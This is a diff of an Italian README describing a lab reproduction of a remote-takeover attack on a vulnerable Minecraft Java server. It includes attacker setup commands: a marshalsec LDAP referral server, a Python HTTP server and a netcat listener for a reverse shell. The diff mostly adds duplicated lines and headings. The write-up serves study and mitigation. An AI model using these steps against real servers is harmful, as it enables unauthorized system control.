@@ -7,8 +7,17 @@
 
 - **(!) L'attaccante può ottenere il controllo completo del sistema, effettuare movimenti laterali e di impatto.**
 
+
+## Threat Model
+*L'attaccante:*
+* Riesce a comunicare con il server vulnerabile;
+    - Ha a disposizione un account valido nel caso in cui il server richieda la verifica dell'account Microsoft.
+
+- **(!) L'attaccante può ottenere il controllo completo del sistema, effettuare movimenti laterali e di impatto.**
+
 ## Preambolo:  cos'è un server Minecraft?
 Minecraft è un videogioco sandbox molto popolare che da vari anni è stato acquisito dalla Microsoft. Il gioco offre due versioni differenti, la "Java Edition" scritta appunto in Java, e la "Bedrock Edition" una versione multi-piattaforma scritta in C++, un server della bedrock edition non supporta client Java e viceversa.
+<br>Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.
 <br>Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.
 
 ---
@@ -59,6 +68,7 @@ java -cp target/marshalsec-[VERSIONE]-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefSe
 python3 -m http.server <porta>
 ``` 
 **4)** Avvio del server Netcat tramite:
+**4)** Avvio del server Netcat tramite:
 ```console
 netcat -lnvp <porta>
 ``` 
@@ -93,6 +103,7 @@ ${{\color{yellowgreen}{{\textbf{\textsf{Possibile raggiro:}}}}}}$ Chiaramente qu
 ##### [1](#poc-e-problematiche-rilevate): Quasi tutti i server di gioco sono impostati con la porta *well-known* '25565', se non diversamente configurati, anche nel nostro caso si è proceduto a lasciare la porta predefinita.
 ##### [2](#problematiche-e-criticità-riscontrate): Questa modifica è stata effettuata sul file `server.properties` contenente la configurazione di base del server, alla riga `max-tick-time` si è sostituito il valore in '-1'.
 ---
+# Mitigazioni e conclusioni
 # Mitigazioni e conclusioni
 L'esecuzione di questo attacco non risulta eccessivamente ostica ma si necessita di server che in un contesto reale ad oggi difficilmente troverebbe applicazione date le patch rilasciate da Microsoft e la difficoltà di trovare, anche intenzionalmente, server vulnerabili.
  
